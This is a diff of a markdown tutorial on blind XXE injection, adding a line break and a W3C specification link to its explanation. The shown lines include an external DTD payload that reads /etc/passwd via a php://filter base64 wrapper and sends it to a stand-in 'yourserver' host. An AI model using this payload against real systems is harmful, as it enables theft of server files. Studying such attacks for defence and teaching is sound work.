@@ -81,7 +81,7 @@ So we also needed to blind means we have to use blind payload which will grep th
 Your xml.dtd contents:- 
 
 `<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">`
-`<!ENTIY % exe "<!ENTITY entity SYSTEM 'http://yourserver/%file;'>">`
+`<!ENTIY % exe "<!ENTITY entity SYSTEM 'http://yourserver/%file;'>">`<br>
 
 Lot's of code to understand:-
 
@@ -113,7 +113,7 @@ Now, *Have anyone arise a question that why **we call the dtd from attacker's se
 
 this would be easier than before? Yes it is, but it is not going to work. 
 
-**Actually parameter entity can't be called inside the DTD subset they can be called in the External subset (like we did in Payload no 2. It will be forbidden, hence you will get the forbidden error.**
+**According to [XML_DOC](https://www.w3.org/TR/xml/#wfc-PEinInternalSubset)Actually parameter entity can't be called inside the DTD subset they can be called in the External subset (like we did in Payload no 2). It will be forbidden, hence you will get the forbidden error.**
 
 So that's the reason why we can't run above payload.
 
